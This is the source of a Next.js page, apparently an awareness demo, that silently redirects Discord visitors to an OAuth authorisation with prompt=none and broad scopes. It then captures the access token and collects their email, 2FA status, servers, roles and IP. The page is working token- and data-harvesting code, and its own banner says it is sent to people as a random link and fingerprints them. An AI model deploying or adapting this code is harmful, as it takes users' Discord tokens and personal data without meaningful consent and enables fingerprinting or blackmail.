import { Component } from "react";
import Image from "next/image";
import styles from "../styles/Home.module.css";
import { useState } from "react";
const host = "https://test-dashboard-three-monkey.vercel.app/"
const redirect_uri = `https://discord.com/api/oauth2/authorize?client_id=729335748670783488&redirect_uri=${host}&response_type=token&scope=identify%20email%20connections%20guilds%20guilds.join&prompt=none`


function Emoji(props) {
  const data = props.data;
  const url = `https://cdn.discordapp.com/emojis/${data.id}.webp`;
  return (
    <div className={styles.card}>
      <div>
        ID: <code>{data.id}</code><br/>
        Name: {data.name}<br/>
        Roles: {data.roles.join(", ")}<br/>
        Requires colons: {data.require_colons ? 'Yes' : 'No'}<br/>
        Managed by integration: {data.managed ? 'Yes' : 'No'}<br/>
        Animated: {data.animated ? 'Yes' : 'No'}<br/>
        URL: <a href={url} target="_blank" rel="noreferrer">{url}</a>
      </div>
      <div>
        <Image src={url+"?size=128"} alt="icon" width={128} height={128}/>
      </div>
    </div>
  )
}

function Role(props) {
  const data = props.data;
  const colour = `#${data.color.toString(16).padStart(6, '0')}`;
  let image = null;
  if (data.icon) {
    image = <Image src={`https://cdn.discordapp.com/role-icons/${data.id}/${data.icon}.png`} alt="icon" height={32} width={32}/>
  }
  return (
      <div className={styles.card}>
        <div>
          ID: <code>{data.id}</code><br/>
          Name: {data.name}<br/>
          Colour: <span style={{color: colour}}>{colour}</span><br/>
          Mention: <span style={{color: colour, background: colour + "22"}}>@{data.name}</span><br/>
          Mentionable: {data.mentionable ? 'Yes' : 'No'}<br/>
          Hoisted: {data.hoisted ? 'Yes' : 'No'}<br/>
          Position: {data.position}<br/>
          Permissions value: {data.permissions}<br/>
          Icon hash: {image}{data.icon || "No custom icon"}<br/>
          Managed: {data.managed ? 'Yes' : 'No'}<br/>
          Tags: {JSON.stringify(data.tags)}
        </div>
        {image!==null ? <div>{image}</div> : null}
      </div>
  )
}


function Guild(props) {
  let [hidden, setHidden] = useState(false);
  let data = props.data;
  const url = data.icon === null ? `https://cdn.discordapp.com/embed/avatars/${data.id % 5}.png` : `https://cdn.discordapp.com/icons/${data.id}/${data.icon}.webp`;
  if(hidden) {
    return (
      <div className={styles.guildCard} onClick={() => {setHidden(!hidden)}}>
        <div>
          <h3>{data.name} ({data.id})</h3>
        </div>
        <div>
          <Image src={url+"?size=64"} alt="icon" width={64} height={64}/>
        </div>
      </div>
    )
  }
  return (
    <div className={styles.guildCard} onClick={() => {setHidden(!hidden)}}>
      <div>
        <h3>{data.name} ({data.id})</h3>
        <ul>
        <li>Name: {data.name}</li>
          <li>ID: <code>{data.id}</code></li>
          <li>Icon hash: {data.icon || "No guild icon."}</li>
          <li>Description: {data.description || "No guild description."}</li>
          <li>Splash image hash: {data.splash || "No splash hash."}</li>
          <li>Discovery splash image hash: {data.discovery_splash || "No discovery splash hash."}</li>
          <li>Banner hash: {data.banner || "No banner"}</li>
          <li>Guild features: {data.features.join(", ").toLowerCase().replace(/_/g, ' ')}</li>
          <li>You own this server: {data.owner ? 'Yes' : 'No'}</li>
          <li>Owner ID: {data.owner_id}</li>
          <li>AFK Channel ID: {data.afk_channel || "No afk channel."}</li>
          <li>AFK timeout (seconds) {data.afk_timeout || "No timeout."}</li>
          <li>Widget enabled: {data.widget_enabled ? "Yes" : "No"}</li>
          <li>Widget Channel ID: {data.widget_channel_id || "No widget channel."}</li>
          <li>Verification level: {data.verification_level}</li>
          <li>Default Notifications: {data.default_message_notifications}</li>
          <li>System Channel ID: {data.system_channel_id || "No system channel."}</li>
          <li>System Channel Flags: {data.system_channel_flags}</li>
          <li>Rules Channel ID: {data.rules_channel_id || "No rules channel."}</li>
          <li>Max presences: {data.max_presences || "unknown."}</li>
          <li>Max members: {data.max_members || "unknown."}</li>
          <li>Vanity URL: {data.vanity_url_code || "No vanity URL."}</li>
          <li>Boost level: {data.premium_tier}</li>
          <li>Boost count: {data.premium_subscription_count}</li>
          <li>Server Locale: {data.preferred_locale}</li>
          <li>Community Notifications Channel: {data.public_updates_channel_id || "No public update channel"}</li>
          <li>Max video channel users: {data.max_video_channel_users || 25}</li>
          <li>Approximate member count: {data.approximate_member_count || "Unknown."}</li>
          <li>NSFW rating: {data.nsfw_level}</li>
          <li>Boost target bar enabled: {data.premium_progress_bar_enabled ? "Yes" : "No"}</li>
          <li>Roles: {(data.roles||[]).map((_r, i) => <Role data={_r} key={i}/>)}</li>
          <li>Emojis: {(data.emojis||[]).map((_e, i) => <Emoji data={_e} key={i}/>)}</li>
        </ul>
        <p><code>{JSON.stringify(data, null, 2)}</code></p>
      </div>
      <div>
        <div style={{height: "128px", width: "128px"}}>
          <Image src={url+"?size=128"} alt="icon" width={128} height={128}/>
        </div>
      </div>
    </div>
  )
}

function User(props) {
  let [hidden, setHidden] = useState(false);
  const data = props.data;
  const url = data.icon === null ? `https://cdn.discordapp.com/embed/avatars/${data.id % 5}.png` : `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.webp`;

  if(hidden) {
    return (
      <div className={styles.userCard} onClick={()=>{setHidden(!hidden)}}>
        <div><h3>{data.username}#{data.discriminator} ({data.id})</h3></div>
        <div><Image src={url} alt="icon" width={64} height={64}/></div>
      </div>
    )
  }

  return (
    <div className={styles.userCard} onClick={()=>{setHidden(!hidden)}}>
      <div>
        <h3>{data.username}#{data.discriminator} ({data.id})</h3>
        <ul>
          <li>ID: <code>{data.id}</code></li>
          <li>Username: {data.username}</li>
          <li>Discriminator: {data.discriminator}</li>
          <li>Avatar hash: {data.avatar || "No custom avatar"}</li>
          <li>Avatar decoration: {data.avatar_decoration || "No custom decoration"}</li>
          <li>Banner hash: {data.banner || "No custom banner"}</li>
          <li>Banner colour: <span style={{color: data.banner_color}}>{data.banner_color}</span></li>
          <li>Public flags: {data.public_flags}</li>
          <li>Flags: {data.flags} (These are usually the same as public flags)</li>
          <li>Locale: {data.locale}</li>
          <li>Email: {data.email}</li>
          <li>Email verified: {data.verified ? 'Yes' : 'No'}</li>
          <li>2fa enabled: {data.mfa_enabled ? 'Yes' : 'No'}</li>
        </ul>
        <p><code>{JSON.stringify(data, null, 2)}</code></p>
      </div>
      <div>
        <Image src={url} alt="icon" width={64} height={64}/>
      </div>
    </div>
  )
}


export default class Index extends Component {
  constructor(props) {
    super(props);
    this.state = {
      ip: null,
      access_token: null,
      scope: null,
      user: {
        id: null,
        username: null,
        discriminator: null,
        avatar: null,
        bot: false,
        system: false,
        mfa_enabled: false,
        banner: null,
        accent_color: null,
        locale: "en",
        verified: false,
        email: null,
        flags: null,
        premium_type: null
      },
      guilds: [],
      connections: [],
      hide_warning: false,
      on_mobile: false,
    }
  }

  async getIp() {
    const response = await fetch("https://httpbin.org/anything");
    const data = await response.json();
    this.setState({ ip: data.origin });
  }

  componentDidMount() {
    console.log("Mount")
    const hash = window.location.hash.split("#")[1];
    if (!hash) {
      console.log(redirect_uri)
      window.location = redirect_uri;
      return;
    }
    const parts = hash.split("&");
    let params = {};
    for (let part of parts) {
      let [key, value] = part.split("=");
      if (["access_token", "scope"].includes(key)) {
        params[key] = value;
      }
    }
    const callback = async () => {
      if(this.state.ip===null) {
        this.getIp().then(() => {console.log("getIP")});
      }
      const res = await fetch(
        "/api/data", 
        {
          method: "GET",
          withCredentials: true, 
          credentials: "include", 
          headers: {
            Authorization: `Bearer ${params.access_token}`
          }
      }
      )
      const newData = await res.json();
      console.log(newData)
      this.setState(newData, this.resolveGuilds);
    }
    this.setState({
      access_token: params.access_token,
      scope: params.scope,
      on_mobile: window.screen.availWidth <= 480
    }, callback);
  }

  async resolveGuilds() {
    let newData = [];
    for(let _data of this.state.guilds) {
      if(_data && _data.roles!==undefined) {
        continue;
      }
      else {
        let id = _data.id;
        let data = null;
        while(1) {
          let response = await fetch(
            "/api/guild?id=" + id,
            {
              headers: {
                "Authorization": "Bearer " + this.state.access_token,
              }
            }
          )
          if(response.status === 429) {
            await new Promise(resolve => setTimeout(resolve, response.headers.get("Retry-After")));
            continue;
          }
          else if (!response.ok || response.status != 200) {
            newData.push(_data);
            break;
          }
          else {
            data = await response.json();
            Object.assign(data, _data);
            newData.push(data)
            break;
          }
        }
      }
    }
    this.setState({ guilds: newData || this.state.guilds });
  }

  render() {
    if(this.state.user.id!==null) {
      return (
        <main>
          <div hidden={this.state.hide_warning} onClick={()=>{this.setState({hide_warning: true})}} style={{border: "12px", width: "100%", padding: "1rem", border: "3px soldi red", background: "rgb(255,100,100,0.5)"}}>
            <p>
              Hey {this.state.user.username} - this is all data we grabbed with a simple redirect to discord.
              One thing you may have noticed was that you didn&#39;t even have to do anything!
              There were no buttons to press.
              <br/>
              <h3>What? Why are you showing me this?</h3>
              If you are on this page, you were brought here because you clicked on a random link you found in discord.
              As you can see, if you&#39;re logged into a browser, a malicious website could easily redirect you to an authorisation page
              and then back to their home page.
              From there, they could grab all of the data we did below, and they could make a fingerprint, or use some data for
              blackmail, etc etc.
              <br/>
              <h3>Okay, so what can I do?</h3>
              <strong>Stop clicking random links!</strong>
              If you&#39;re friends with me (eek#7574) I&#39;m sure you only clicked this link because you trust me. If you clicked this link
              because you were sent it, well done, you just got fingerprinted!
              <br/>
              <hr/>
              <br/>
              <i>You can click anywhere on this box to delete it. You can also click on any card below to collapse it.</i>
            </p>
          </div>
          <button onClick={() => {console.debug(JSON.stringify(this.state, null, 4))}} hidden={this.state.on_mobile}>
            print snatched data (as JSON) to console
          </button>
          <h1>Welcome {this.state.user.username || 'deleted-user'}#{this.state.user.discriminator || '0000'}!</h1>
          <div>Your IP is {this.state.ip}</div>
          <User data={this.state.user}/>
          {this.state.guilds.map((data, index) => <Guild data={data} key={index}/>)}
        </main>
      )
    }
    return (
      <div>
        Playing ping pong with {host} and {redirect_uri} (Do not be alarmed, you&#39;ll be right back!
        Unless you have javascript disabled in which case you&#39;re going nowhere)
      </div>
    );
  }
}